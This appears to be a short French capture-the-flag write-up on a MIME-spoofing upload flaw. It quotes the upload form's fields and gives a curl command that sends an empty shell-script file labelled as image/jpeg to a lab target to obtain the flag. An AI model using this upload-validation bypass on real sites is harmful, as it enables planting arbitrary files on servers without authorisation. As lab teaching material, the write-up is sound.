On se retrouve sur la page d'upload d'image, il s'agis ici d'une faille 
de type "mime spoofing", il s'agit d'upload de fichier de tout type, qu'on le fait passer pour une image.

On doit imiter le comportement du submit du formulaire sur le site.

On retrouve un premier input qui est celui ou l'on choisis son fichier, qui sera appeller "uploaded".
<input name="uploaded" type="file">

Et un deuxieme qui est un bouton qui va trigger le submit du formulaire.
<input type="submit" name="Upload" value="Upload">

On va donc envoyer un form data avec curl avec les memes noms de variables qui sont utilisees sur le formulaire:
On choisis par exemple d'upload un faux script shell.

touch fake_script.sh
curl -s -X POST -F "uploaded=@./fake_script.sh;type=image/jpeg" -F "Upload=Upload" "http://{ip}/index.php?page=upload"

On recupere une page html, contenant le flag.
